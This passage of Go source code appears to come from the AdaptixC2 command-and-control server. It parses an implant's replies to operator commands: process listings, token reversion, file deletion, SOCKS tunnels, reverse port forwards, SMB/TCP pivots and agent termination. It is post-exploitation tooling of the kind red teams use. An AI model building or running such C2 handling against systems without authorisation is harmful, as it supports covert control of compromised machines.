				task.MessageType = adaptix.MESSAGE_ERROR

			} else {
				processCount := int(packer.ParseInt32())

				if processCount == 0 {
					task.Message = "Failed to get process list"
					task.MessageType = adaptix.MESSAGE_ERROR
					break
				}

				contextMaxSize := 10

				for i := 0; i < processCount; i++ {
					if false == packer.CheckPacker([]string{"word", "word", "word", "byte", "byte", "array", "array", "array"}) {
						goto HANDLER
					}
					procData := adaptix.ListingProcessDataWin{
						Pid:       uint(packer.ParseInt16()),
						Ppid:      uint(packer.ParseInt16()),
						SessionId: uint(packer.ParseInt16()),
						Arch:      "",
					}

					isArch64 := packer.ParseInt8()
					if isArch64 == 0 {
						procData.Arch = "x32"
					} else if isArch64 == 1 {
						procData.Arch = "x64"
					}

					elevated := packer.ParseInt8()
					domain := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					username := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

					if username != "" {
						procData.Context = username
						if domain != "" {
							procData.Context = domain + "\\" + username
						}
						if elevated > 0 {
							procData.Context += " *"
						}

						if len(procData.Context) > contextMaxSize {
							contextMaxSize = len(procData.Context)
						}
					}

					procData.ProcessName = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					proclist = append(proclist, procData)
				}

				type TreeProc struct {
					Data     adaptix.ListingProcessDataWin
					Children []*TreeProc
				}

				procMap := make(map[uint]*TreeProc)
				var roots []*TreeProc

				for _, proc := range proclist {
					node := &TreeProc{Data: proc}
					procMap[proc.Pid] = node
				}

				for _, node := range procMap {
					if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
						roots = append(roots, node)
					} else if parent, ok := procMap[node.Data.Ppid]; ok {
						parent.Children = append(parent.Children, node)
					} else {
						roots = append(roots, node) // orphaned node
					}
				}

				sort.Slice(roots, func(i, j int) bool {
					return roots[i].Data.Pid < roots[j].Data.Pid
				})

				var sortChildren func(node *TreeProc)
				sortChildren = func(node *TreeProc) {
					sort.Slice(node.Children, func(i, j int) bool {
						return node.Children[i].Data.Pid < node.Children[j].Data.Pid
					})
					for _, child := range node.Children {
						sortChildren(child)
					}
				}
				for _, root := range roots {
					sortChildren(root)
				}

				format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
				OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
				OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

				var lines []string

				var formatTree func(node *TreeProc, prefix string, isLast bool)
				formatTree = func(node *TreeProc, prefix string, isLast bool) {
					branch := "├─ "
					if isLast {
						branch = "└─ "
					}
					treePrefix := prefix + branch
					data := node.Data

					line := fmt.Sprintf(format, data.Pid, data.Ppid, data.SessionId, data.Arch, data.Context, treePrefix+data.ProcessName)
					lines = append(lines, line)

					childPrefix := prefix
					if isLast {
						childPrefix += "    "
					} else {
						childPrefix += "│   "
					}

					for i, child := range node.Children {
						formatTree(child, childPrefix, i == len(node.Children)-1)
					}
				}

				for i, root := range roots {
					formatTree(root, "", i == len(roots)-1)
				}

				OutputText += "\n" + strings.Join(lines, "\n")
				task.Message = "Process list:"
				task.ClearText = OutputText
			}
			Ts.TsClientGuiProcessWindows(task, proclist)

		case COMMAND_PS_KILL:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			task.Message = fmt.Sprintf("Process %d killed", pid)

		case COMMAND_PS_RUN:
			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}

			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)

		case COMMAND_PWD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_REV2SELF:
			task.Message = "Token reverted successfully"
			emptyImpersonate := ""
			_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
				Impersonated *string `json:"impersonated"`
			}{Impersonated: &emptyImpersonate})

		case COMMAND_RM:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}

		case COMMAND_TUNNEL_START_TCP:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}

			channelId := int(TaskId)
			_ = packer.ParseInt32()
			result := packer.ParseInt32()
			if result == 0 {
				Ts.TsTunnelConnectionResume(agentData.Id, channelId, false)
			} else if result == 1 {
				Ts.TsTunnelConnectionClose(channelId, true)
			} else {
				errorCode := adaptix.SOCKS5_HOST_UNREACHABLE
				if result == 10061 { // WSAECONNREFUSED
					errorCode = adaptix.SOCKS5_CONNECTION_REFUSED
				}
				Ts.TsTunnelConnectionHalt(channelId, errorCode)
			}

		case COMMAND_TUNNEL_WRITE_TCP:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}

			channelId := int(TaskId)
			data := packer.ParseBytes()
			Ts.TsTunnelConnectionData(channelId, data)

		case COMMAND_TUNNEL_REVERSE:
			if false == packer.CheckPacker([]string{"int", "int"}) {
				goto HANDLER
			}
			var err error
			tunnelId := int(TaskId)
			_ = packer.ParseInt32()
			result := packer.ParseInt32()
			if result == 0 {
				task.TaskId, task.Message, err = Ts.TsTunnelUpdateRportfwd(tunnelId, false)
			} else {
				task.TaskId, task.Message, err = Ts.TsTunnelUpdateRportfwd(tunnelId, true)
			}

			if err != nil {
				task.MessageType = adaptix.MESSAGE_ERROR
			} else {
				task.MessageType = adaptix.MESSAGE_SUCCESS
			}

		case COMMAND_TUNNEL_ACCEPT:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			tunnelId := int(TaskId)
			channelId := int(packer.ParseInt32())
			Ts.TsTunnelConnectionAccept(tunnelId, channelId)

		case COMMAND_TUNNEL_PAUSE:
			channelId := int(TaskId)
			Ts.TsTunnelPause(channelId)

		case COMMAND_TUNNEL_RESUME:
			channelId := int(TaskId)
			Ts.TsTunnelResume(channelId)

		case COMMAND_TUNNEL_CLOSE:
			if false == packer.CheckPacker([]string{"int", "int"}) {
				goto HANDLER
			}
			_ = packer.ParseInt32()
			_ = packer.ParseInt32()
			channelId := int(TaskId)
			Ts.TsTunnelConnectionClose(channelId, false)

		case COMMAND_TERMINATE:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			exitMethod := packer.ParseInt32()
			if exitMethod == 1 {
				task.Message = "The agent has completed its work (kill thread)"
			} else if exitMethod == 2 {
				task.Message = "The agent has completed its work (kill process)"
			}

			_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

		case COMMAND_UNLINK:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotType := packer.ParseInt8()

			messageParent := ""
			messageChild := ""
			_, parentAgentId, childAgentId := Ts.TsGetPivotInfoById(pivotId)

			if pivotType == 1 {
				messageParent = fmt.Sprintf("SMB agent disconnected %s", childAgentId)
				messageChild = fmt.Sprintf(" ----- SMB agent disconnected from [%s] ----- ", parentAgentId)
			} else if pivotType == 2 {
				messageParent = fmt.Sprintf("TCP agent %s connection reset", childAgentId)
				messageChild = fmt.Sprintf(" ----- TCP agent connection reset ----- ")
			} else if pivotType == 10 {
				messageParent = fmt.Sprintf("Pivot agent %s connection reset", childAgentId)
				messageChild = fmt.Sprintf(" ----- Pivot agent connection reset ----- ")
			}

			if pivotType != 0 {
				_ = Ts.TsPivotDelete(pivotId)
				if TaskId == 0 {
					Ts.TsAgentConsoleOutput(parentAgentId, adaptix.MESSAGE_SUCCESS, messageParent, "\n", true)
				} else {
					task.Message = messageParent
				}
				Ts.TsAgentConsoleOutput(childAgentId, adaptix.MESSAGE_SUCCESS, messageChild, "\n", true)
			}

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			Ts.TsClientGuiFilesStatus(task)

		case COMMAND_ERROR:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
			task.MessageType = adaptix.MESSAGE_ERROR

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

HANDLER:

	/// END CODE

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}
